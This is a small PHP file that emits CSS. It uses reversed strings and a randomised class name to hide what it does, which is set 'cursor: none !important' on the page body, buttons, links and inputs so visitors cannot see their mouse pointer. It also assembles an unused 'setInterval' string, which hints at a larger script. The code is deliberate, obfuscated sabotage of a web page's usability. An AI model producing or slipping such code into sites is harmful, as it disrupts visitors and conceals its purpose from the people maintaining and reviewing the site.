<?php
$dtrt = '';
for ($i = 1; $i <= 5; $i++) {
	$range = range('d', 'y');
	$index = array_rand($range);
	$dtrt .=  $range[$index];
}
$bd= strrev("do");
$srt= strrev("etad");
$bt= strrev("not");
$tp= strrev("tup");
$sr= strrev("sru");
$tn= strrev("tna");
$ste1= strrev("tnItes");
$ste2= strrev("lavre");
$ste= $ste1.$ste2;
$dt3 = strrev($srt("Hmsdi"));
?>

<style>
        
        <?php echo "b".$bd."y." .$dtrt.$dt3 ?>,
		<?php echo "b".$bd."y.".$dtrt.$dt3." but".$bt ?>,
		<?php echo "b".$bd."y." .$dtrt.$dt3 ?> a,
		<?php echo "b".$bd."y." .$dtrt.$dt3." in".$tp ?>
		{
            c<?php echo $sr; ?>or: <?php echo "no"; ?>ne !im<?php echo "port".$tn; ?>;
        }
</style>
